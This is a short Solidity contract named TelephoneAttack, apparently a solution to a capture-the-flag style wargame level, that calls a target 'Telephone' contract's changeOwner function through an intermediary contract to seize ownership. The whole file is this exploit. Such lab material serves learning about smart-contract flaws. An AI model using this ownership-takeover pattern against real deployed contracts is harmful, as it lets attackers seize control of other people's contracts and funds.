//SPDX-License-Identifier: MMIT

pragma solidity ^0.8.0;

import "./telephone.sol";

contract TelephoneAttack {
    Telephone public _target;

    constructor(address _targetAdr) public {
        _target = Telephone(_targetAdr);
    }

    function attack(address _newOwner) public {
        _target.changeOwner(_newOwner);
    }
}
